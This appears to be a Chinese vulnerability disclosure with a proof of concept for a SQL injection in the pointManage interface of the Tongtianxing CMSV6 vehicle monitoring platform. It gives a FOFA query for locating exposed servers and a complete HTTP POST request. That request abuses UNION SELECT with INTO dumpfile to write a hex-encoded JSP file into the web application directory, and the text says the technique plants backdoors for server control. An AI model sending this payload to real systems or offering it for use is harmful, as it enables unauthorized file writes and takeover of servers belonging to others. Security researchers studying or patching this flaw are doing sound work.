## 通天星CMSV6接口pointManage存在SQL注入

通天星CMSV6车载定位监控平台拥有以位置服务、无线3G/4G视频传输、云存储服务为核心的研发团队，专注于为定位、无线视频终端产品提供平台服务，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。其pointManage存在SQL注入，恶意攻击者利用此漏洞向服务器写入恶意的后门文件，从而获取服务器权限。

## fofa

```
body="/808gps"
```

## poc

```
POST /point_manage/merge HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.2882.93 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Host: ip

id=1&name=1' UNION SELECT%0aNULL, 0x3c25206f75742e7072696e7428227a7a3031306622293b206e6577206a6176612e696f2e46696c65286170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574536572766c657450617468282929292e64656c65746528293b20253e,NULL,NULL,NULL,NULL,NULL,NULL
INTO dumpfile '../../tomcat/webapps/gpsweb/allgods.jsp' FROM user_session a
WHERE '1 '='1 &type=3&map_id=4&install_place=5&check_item=6&create_time=7&update_time=8
```

![image-20240626220451434](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406262204554.png)

![image-20240626220720642](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406262207750.png)